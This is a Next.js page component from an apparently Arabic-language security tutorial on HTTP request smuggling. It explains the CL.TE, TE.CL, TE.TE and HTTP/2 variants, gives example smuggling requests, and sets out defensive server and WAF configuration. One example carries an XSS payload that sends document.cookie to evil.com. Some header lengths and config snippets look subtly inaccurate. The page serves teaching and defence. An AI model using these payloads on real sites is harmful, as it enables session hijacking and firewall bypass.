import Link from 'next/link'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'

export default function HttpSmugglingPage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      <section className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">&#x1F6AA;</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">تهريب الطلبات HTTP</h1>
            <p className="text-xl text-gray-500 mt-1">HTTP Request Smuggling</p>
          </div>
        </div>
        <div className="bg-danger-50 border border-danger-200 rounded-lg p-4 mb-6">
          <p className="text-danger-700 font-semibold mb-0">
            &#x26A0; مستوى الخطورة: عالي جداً (Critical)
          </p>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">تعريف HTTP Request Smuggling</h2>
        <p>
          تهريب الطلبات HTTP (HTTP Request Smuggling) هو ثغرة أمنية تعتمد على الطريقة التي يتعامل بها proxy servers وload balancers مع الخوادم الخلفية (backend servers). يحدث عندما تكون هناك عدم توافق في كيفية تحديد نهاية طلب HTTP وبداية طلب آخر بين مكونات البنية التحتية المختلفة.
        </p>
        <p>
          يسمح هذا الهجوم للمهاجم بإدخال طلب HTTP مغرض &quot;مهرب&quot; داخل طلب شرعي، مما يتيح له اختراق الجدران النارية وتوجيه الطلبات إلى مستخدمين آخرين أو الوصول إلى بيانات حساسة غير مصرح بها.
        </p>
        <div className="bg-warning-50 border border-warning-200 rounded-lg p-4 mb-6">
          <p className="text-warning-700 mb-0">
            <strong>الفكرة الأساسية:</strong> عندما لا يتفق الـ frontend server والـ backend server حول مكان انتهاء طلب ما وبداية طلب آخر، يمكن للمهاجم استغلال هذا الخلاف ل&quot;تهريب&quot; طلب إضافي.
          </p>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أنواع HTTP Request Smuggling</h2>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">1. CL.TE (Content-Length vs Transfer-Encoding)</h3>
          <p>
            النوع الأكثر شيوعاً. يعتمد الـ frontend على header <code className="bg-gray-200 px-1 rounded">Content-Length</code> بينما يعتمد الـ backend على <code className="bg-gray-200 px-1 rounded">Transfer-Encoding: chunked</code>.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}
            </pre>
          </div>
          <p className="mt-4">
            <strong>كيف يعمل:</strong> الـ frontend يرى أن الطلب يحتوي على 13 بايت فقط (بسبب Content-Length)، بينما الـ backend يرى طلبين: الأول &quot;0&quot; (نهاية chunk) والثاني &quot;SMUGGLED&quot; كطلب منفصل.
          </p>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">2. TE.CL (Transfer-Encoding vs Content-Length)</h3>
          <p>
            العكس من النوع الأول. الـ frontend يعتمد على <code className="bg-gray-200 px-1 rounded">Transfer-Encoding</code> بينما الـ backend يعتمد على <code className="bg-gray-200 px-1 rounded">Content-Length</code>.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0`}
            </pre>
          </div>
          <p className="mt-4">
            <strong>كيف يعمل:</strong> الـ frontend يرى أن الـ chunk الأول يحتوي على 8 بايت، لكن الـ backend يقرأ فقط 3 بايت (بسبب Content-Length)، تاركاً &quot;GLLED\\r\\n0\\r\\n\\r\\n&quot; كبداية للطلب التالي.
          </p>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">3. TE.TE (Transfer-Encoding vs Transfer-Encoding)</h3>
          <p>
            كلا الـ frontend والـ backend يعتمدان على Transfer-Encoding، لكن بطريقة مختلفة. يحدث عندما يعالج أحدهما header بشكل مختلف (مثل حذف أحرف معينة أو تجاهل أسطر معينة).
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: x-chunked

5
hello
0`}
            </pre>
          </div>
          <p className="mt-4">
            <strong>كيف يعمل:</strong> بعض الخوادم تحذف أحرف غير قياسية من قيم الترويسة، أو تتعامل مع التكرار بشكل مختلف، مما يؤدي إلى عدم التوافق.
          </p>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">4. H2.CL (HTTP/2 Content-Length)</h3>
          <p>
            يستغل هذا النوع مشاكل في التعامل مع HTTP/2 downgrade إلى HTTP/1.1. يحدث عندما يحول الـ proxy طلبات HTTP/2 إلى HTTP/1.1 بشكل غير صحيح.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// في HTTP/2، يتم إرسال الطلبات كـ headers frame
// لكن عند التحويل إلى HTTP/1.1:

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

evil`}
            </pre>
          </div>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-gray-800 mb-3">5. H2.TE (HTTP/2 Transfer-Encoding)</h3>
          <p>
            يستغل الفروق في كيفية تعامل HTTP/2 مع Transfer-Encoding مقارنة بـ HTTP/1.1. بعض الـ proxies تقبل Transfer-Encoding في HTTP/2 رغم أن البروتوكول لا يدعمه.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// إرسال طلب HTTP/2 مع Transfer-Encoding
// ثم تحويله إلى HTTP/1.1 عند الـ proxy

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com`}
            </pre>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">أمثلة حقيقية على الهجوم</h2>

        <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-danger-700 mb-3">&#x1F6A8; مثال 1: سرقة جلسة مستخدم آخر (Session Hijacking)</h3>
          <p>
            يمكن للمهاجم توجيه طلب مهرب يحتوي على ملفات تعريف ارتباط مستخدم آخر إلى حسابه الخاص.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// الطلب الأول (من المهاجم)
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /profile HTTP/1.1
Cookie: session=hijacked_session_id
Host: vulnerable-website.com

// عندما يرسل مستخدم آخر طلب GET عادي،
// الـ backend يُرفقه مع الطلب المهرب
// فيتم عرض بيانات المستخدم للمهاجم`}
            </pre>
          </div>
        </div>

        <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-danger-700 mb-3">&#x1F6A8; مثال 2: اختراق الجدار الناري (Firewall Bypass)</h3>
          <p>
            يمكن استخدام التهريب للوصول إلى موارد داخلية محمية بالجدار الناري.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// الطلب المهرب
POST /api/public HTTP/1.1
Host: vulnerable-website.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /admin/internal HTTP/1.1
Host: internal-server.local
X-Forwarded-For: 127.0.0.1`}
            </pre>
          </div>
        </div>

        <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 mb-6">
          <h3 className="text-xl font-bold text-danger-700 mb-3">&#x1F6A8; مثال 3: حقن XSS عبر التهريب</h3>
          <p>
            يمكن دمج تهريب الطلبات مع هجمات XSS لحقن أكواد ضارة في صفحات المستخدمين الآخرين.
          </p>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
            <pre className="text-sm">
{`// طلب مهرب يحتوي على XSS
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> HTTP/1.1
Host: vulnerable-website.com`}
            </pre>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">كيف تكتشف HTTP Request Smuggling</h2>

        <h3 className="text-xl font-bold text-gray-800 mb-3">علامات الضعف المحتملة</h3>
        <ul className="list-disc mr-6 mb-4">
          <li>عدم توافق في معالجة Content-Length و Transfer-Encoding بين الخوادم</li>
          <li>وجود proxy أو load balancer أمام خادم HTTP رئيسي</li>
          <li>استخدام خوادم HTTP قديمة أو غير محدثة</li>
          <li>عدم وجود تدقيق على headers المكررة</li>
          <li>استخدام HTTP/2 مع تحويل إلى HTTP/1.1</li>
        </ul>

        <h3 className="text-xl font-bold text-gray-800 mb-3">أدوات الاكتشاف</h3>
        <ul className="list-disc mr-6 mb-4">
          <li><strong>Burp Suite Pro</strong> - يحتوي على ميزات متخصصة لاكتشاف تهريب الطلبات</li>
          <li><strong>HTTP Request Smuggler</strong> - إضافة Burp Suite مجانية</li>
          <li><strong>Smuggler</strong> - أداة سطر أوامر لاكتشاف الثغرة</li>
          <li><strong>OWASP ZAP</strong> - مع إضافات الاكتشاف</li>
        </ul>

        <h3 className="text-xl font-bold text-gray-800 mb-3">تقنيات الاكتشاف اليدوية</h3>
        <div className="bg-gray-900 text-gray-100 p-4 rounded-lg">
          <pre className="text-sm">
{`# اختبار CL.TE
# أرسل طلب مع Content-Length غير متطابق مع Transfer-Encoding
# وراقب استجابة الخادم

# اختبار TE.CL
# أرسل طلب مع Transfer-Length و Content-Length غير متطابق

# اختبار TE.TE
# أرسل Transfer-Encoding مكرر بأشكال مختلفة
# Transfer-Encoding: chunked
# Transfer-Encoding: x-chunked

# مراقبة التوقيت (Timing-based detection)
# قارن أوقات الاستجابة بين الطلبات العادية والمهربة`}
          </pre>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">طرق الحماية والعلاج</h2>

        <div className="space-y-6">
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">1. توحيد الطلبات (Request Normalization)</h3>
            <p>
              قم بتوحيد جميع الطلبات الواردة قبل معالجتها. تأكد من أن جميع الخوادم تفسر Content-Length و Transfer-Encoding بنفس الطريقة.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`// في Node.js/Express
const helmet = require('helmet');
const express = require('express');
const app = express();

// إزالة Transfer-Encoding من الطلبات الواردة
app.use((req, res, next) => {
  // إزالة Transfer-Encoding لمنع التهريب
  delete req.headers['transfer-encoding'];

  // التحقق من Content-Length
  const contentLength = parseInt(req.headers['content-length']);
  if (isNaN(contentLength) || contentLength < 0) {
    return res.status(400).send('Invalid Content-Length');
  }

  next();
});`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">2. تعطيل HTTP/2 أو تطبيقه بشكل صحيح</h3>
            <p>
              إذا كنت لا تحتاج HTTP/2، فتعطيله يزيل متجه الهجوم H2.CL و H2.TE. إذا كنت تحتاجه، تأكد من تطبيقه بشكل صحيح.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`# في Apache
# تعطيل HTTP/2
Protocols -http/2

# في Nginx
# عدم تفعيل http2 في الإعدادات
listen 443 ssl;

# في Node.js مع Express
const spdy = require('spdy');
// لا تستخدم spdy إذا كنت لا تحتاج HTTP/2`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">3. تكوين الخادم بشكل صحيح</h3>
            <p>
              تأكد من أن جميع مكونات البنية التحتية (proxies, load balancers, WAFs) مكونة بشكل صحيح لمنع التهريب.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`# في Nginx كـ proxy
location / {
  proxy_pass http://backend;

  # تحديد Content-Length بشكل صارم
  proxy_set_header Content-Length $content_length;

  # منع Transfer-Encoding
  proxy_hide_header Transfer-Encoding;

  # إعدادات أمان إضافية
  proxy_http_version 1.1;
  proxy_set_header Connection "";
}

# في HAProxy
backend servers
  balance roundrobin
  option http-server-close
  option forceclose
  http-request del-header Transfer-Encoding`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">4. استخدام Web Application Firewall (WAF)</h3>
            <p>
              WAF مكون بشكل صحيح يمكنه اكتشاف وحظر طلبات التهريب المغرضة.
            </p>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg mt-4">
              <pre className="text-sm">
{`# قواعد WAF للكشف عن التهريب

# حظر Transfer-Encoding المكرر
SecRule &REQUEST_HEADERS:Transfer-Encoding "chunked,\\s*chunked" \\
  "id:1001,phase:1,deny,status:403,log,msg:'Duplicate TE header'"

# حظر Content-Length غير الرقمي
SecRule &REQUEST_HEADERS:Content-Length "!@rx ^\\d+$" \\
  "id:1002,phase:1,deny,status:403,log,msg:'Invalid CL header'"

# حظر الطلب إذا كان كلا الرأسيين موجودين
SecRule &REQUEST_HEADERS:Transfer-Encoding "@gt 0" \\
  "chain,deny,status:403,log,msg:'Both CL and TE present'"
  SecRule &REQUEST_HEADERS:Content-Length "@gt 0"`}
              </pre>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
            <h3 className="text-xl font-bold text-gray-800 mb-3">5. تحديث الخوادم والبرامج</h3>
            <p>
              تأكد من استخدام أحدث إصدارات الخوادم والـ proxies، حيث تحتوي الإصدارات الحديثة على إصلاحات أمنية لثغرات التهريب.
            </p>
            <ul className="list-disc mr-6 mt-4">
              <li>حدّث Apache إلى أحدث إصدار</li>
              <li>حدّث Nginx إلى أحدث إصدار</li>
              <li>حدّث HAProxy إلى أحدث إصدار</li>
              <li>حدّث خوادم Tomcat و Jetty</li>
              <li>راجع CVEs الخاصة بخادمك وطبّق التصحيحات</li>
            </ul>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">نصائح أمنية</h2>
        <div className="bg-success-50 border border-success-200 rounded-lg p-6">
          <ul className="space-y-3">
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span><strong>القاعدة الذهبية:</strong> لا تثق أبداً بـ headers الواردة من المستخدم</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>تأكد من أن جميع مكونات البنية التحتية تفسر الطلبات بنفس الطريقة</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>استخدم HTTP/1.1 فقط إذا كنت لا تحتاج إلى ميزات HTTP/2</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>قم بتوحيد الطلبات قبل معالجتها</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>استخدم WAF مع قواعد محددة للكشف عن التهريب</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>حدّث جميع مكونات البنية التحتية بانتظام</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-success-600 mt-1">&#x2714;</span>
              <span>راقب السجلات بحثاً عن أنماط غير طبيعية في الطلبات</span>
            </li>
          </ul>
        </div>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">الأخطاء الشائعة</h2>
        <div className="space-y-4">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; استخدام خوادم قديمة غير محدثة</h4>
            <p className="text-gray-600 mb-0">الخوادم القديمة تحتوي على ثغرات تهريب معروفة ومصممة</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; عدم توحيد تفسير Headers</h4>
            <p className="text-gray-600 mb-0">عدم التأكد من أن جميع المكونات تفسر Content-Length و Transfer-Encoding بنفس الطريقة</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; تفعيل HTTP/2 بدون فهم المخاطر</h4>
            <p className="text-gray-600 mb-0">HTTP/2 يفتح متجهات هجوم إضافية مثل H2.CL و H2.TE</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; عدم استخدام WAF بشكل صحيح</h4>
            <p className="text-gray-600 mb-0">WAF بدون قواعد محددة للكشف عن التهريب لا يوفر الحماية الكافية</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-700 mb-2">&#x274C; تجاهل اختبارات الاختراق</h4>
            <p className="text-gray-600 mb-0">عدم اختبار ثغرة التهريب بشكل دوري يترك الثغرة دون اكتشاف</p>
          </div>
        </div>
      </section>

      <section className="mb-12">
        <ToolsSection slug="http-smuggling" />
      </section>

      <section className="mb-12">
        <VideoSection slug="http-smuggling" />
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 mb-4">الثغرات الأخرى</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link href="/vulnerabilities/ssrf" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F5A5;&#xFE0F;</span>
            <h4 className="font-bold mt-2">SSRF</h4>
          </Link>
          <Link href="/vulnerabilities/sql-injection" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F489;</span>
            <h4 className="font-bold mt-2">حقن SQL</h4>
          </Link>
          <Link href="/vulnerabilities/xss" className="block bg-gray-50 border border-gray-200 rounded-lg p-4 hover:shadow-md transition">
            <span className="text-2xl">&#x1F4DC;</span>
            <h4 className="font-bold mt-2">XSS</h4>
          </Link>
        </div>
      </section>
    </div>
  )
}
